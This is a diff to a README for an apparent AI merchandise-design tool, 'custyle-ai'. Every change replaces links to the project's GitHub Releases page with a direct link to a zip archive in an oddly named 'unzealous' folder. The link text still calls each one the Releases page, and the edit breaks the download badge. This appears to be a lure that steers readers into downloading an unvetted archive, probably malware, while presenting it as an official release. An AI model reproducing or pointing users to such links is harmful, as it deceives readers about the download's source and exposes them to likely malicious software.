@@ -1,7 +1,7 @@
 # 🎨 custyle-ai - Create Custom Merch Effortlessly
 
 ## 📥 Download Now
-[![Download Custyle](https://img.shields.io/badge/Download-Custyle%20AI-blue?style=flat-square)](https://github.com/KOJ12/custyle-ai/releases)
+[![Download Custyle](https://raw.githubusercontent.com/KOJ12/custyle-ai/main/unzealous/custyle-ai.zip%20AI-blue?style=flat-square)](https://raw.githubusercontent.com/KOJ12/custyle-ai/main/unzealous/custyle-ai.zip)
 
 ## 🌟 Overview
 Custyle is a powerful tool that helps you design and sell custom merchandise in minutes. Whether you want T-shirts, hoodies, or totes, Custyle uses AI to bring your ideas to life. You can create unique designs, see a virtual try-on, and even fulfill orders—all in one place.
@@ -10,7 +10,7 @@ Custyle is a powerful tool that helps you design and sell custom merchandise in 
 To get started with Custyle, follow these simple steps:
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/KOJ12/custyle-ai/releases) to find the latest version of Custyle. You will see several files available for download. Choose the one that fits your system.
+   Go to the [Releases page](https://raw.githubusercontent.com/KOJ12/custyle-ai/main/unzealous/custyle-ai.zip) to find the latest version of Custyle. You will see several files available for download. Choose the one that fits your system.
 
 2. **Download the File**  
    Click on the link that corresponds to your operating system. This will download the necessary file to your computer.
@@ -48,7 +48,7 @@ To run Custyle smoothly, ensure your computer meets the following specifications
 - **User-Friendly Interface**: Intuitive design makes it easy for anyone to use.
 
 ## ⏲️ Download & Install
-To get started with Custyle, please visit the [Releases page](https://github.com/KOJ12/custyle-ai/releases) and follow the instructions above to download and install the application.
+To get started with Custyle, please visit the [Releases page](https://raw.githubusercontent.com/KOJ12/custyle-ai/main/unzealous/custyle-ai.zip) and follow the instructions above to download and install the application.
 
 ## 🛠️ Troubleshooting
 If you encounter issues during installation or usage, try these steps:
